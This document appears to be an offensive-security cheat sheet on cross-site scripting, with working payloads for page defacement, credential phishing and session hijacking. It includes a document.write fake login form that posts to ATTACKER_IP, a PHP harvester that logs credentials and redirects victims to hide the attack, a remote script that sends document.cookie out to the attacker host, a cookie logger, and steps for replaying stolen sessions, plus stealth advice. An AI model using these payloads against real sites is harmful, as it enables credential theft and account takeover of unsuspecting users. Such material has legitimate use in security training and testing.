# Cross-Site Scripting (XSS) Tradecraft
**Concept:** XSS allows an attacker to execute arbitrary JavaScript in the victim's browser. 
**Impact:** Control over the DOM (Defacement), stealing user input (Phishing), or stealing active sessions (Hijacking).
## 1. Defacement (Visual Manipulation)
**Goal:** Alter the visual appearance of the webpage to demonstrate impact or disrupt operations. 
**Mechanism:** Manipulating the DOM via JavaScript.
### Modification Payloads
| **Target**           | **JavaScript Payload**                        | **Effect**                                      |
| -------------------- | --------------------------------------------- | ----------------------------------------------- |
| *Background Color* | `document.body.style.background = "#141d2b"`  | Changes background to dark blue.                |
| *Background Image* | `document.body.background = "url_to_image"`   | Sets a background image.                        |
| *Page Title*       | `document.title = 'Hacked'`                   | Changes the browser tab title.                  |
| *Page Content*     | `document.body.innerHTML = '<h1>Hacked</h1>'` | **Destructive.** Replaces the entire page body. |

**Example (Complete Overwrite):**
```html
<script>
  document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: red">Compromised</h1></center>'
</script>
```
## 2. Phishing (Credential Harvesting)
**Goal:** Inject a fake login form into the vulnerable page to trick the user into submitting credentials to an attacker-controlled server. 
**Method:** Reflected XSS (Targeted) or Stored XSS (Watering Hole).
### Step 1: The Injection Payload (Client-Side)
We use `document.write` to overwrite the page content with a fake login form pointing to our IP.
```js
// Minified Payload for Injection
document.write('<h3>Please login to continue</h3><form action="http://<ATTACKER_IP>/index.php" method="POST"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```
### Step 2: The Listener (Server-Side)
We need a server to receive the credentials and redirect the user back to safety to reduce suspicion.

**PHP Harvester (`index.php`):**
```php
<?php
// Save as index.php in /tmp/tmpserver/
if (isset($_REQUEST['username']) && isset($_REQUEST['password'])) {
    $file = fopen("creds.txt", "a+");
    // Log credentials to file
    fputs($file, "User: {$_REQUEST['username']} | Pass: {$_REQUEST['password']}\n");
    fclose($file);
    // Redirect victim back to original site to hide the attack
    header("Location: http://<TARGET_URL>");
    exit();
}
?>
```

**Start Server:**
```shell
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```
## 3. Session Hijacking (Cookie Theft)
**Goal:** Steal the victim's `Session ID` (Cookie) to take over their account without knowing their password. 
**Requirement:** The session cookie must **not** have the `HttpOnly` flag set.
### Step 1: Remote Script Loading (Blind XSS)
Instead of writing complex JS in the URL, load a remote script from your server. This is cleaner and easier to manage.
```html
<script src="http://<ATTACKER_IP>/script.js"></script>
```
### Step 2: The Exfiltration Payload (`script.js`)
Host this file on your attacker machine. It creates a hidden image request that appends the cookie to the URL.
```js
// script.js
new Image().src = 'http://<ATTACKER_IP>/index.php?c=' + document.cookie;
```
- **OPSEC Note:** `new Image().src` is quieter than `document.location` because it doesn't redirect the user's browser; it just makes a background network request. 
### Step 3: The Listener (Server-Side)
**PHP Cookie Logger (`index.php`):**
```php
<?php
// Save as index.php
if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $file = fopen("cookies.txt", "a+");
    // Log IP and Cookie
    fputs($file, "IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
    fclose($file);
}
?>
```
### Step 4: Execution (Session Reuse)
1. **Wait** for a victim (or Bot) to trigger the XSS.
2. **Check** `cookies.txt` on your server.
3. **Import** the cookie:
    - Open Browser Dev Tools (`F12`) -> Storage -> Cookies.
    - Click `+` to add a new cookie.
    - **Name:** (e.g., `PHPSESSID`)
    - **Value:** (The stolen string, e.g., `f904f9...`)
4. **Refresh** the page. You should be logged in as the victim.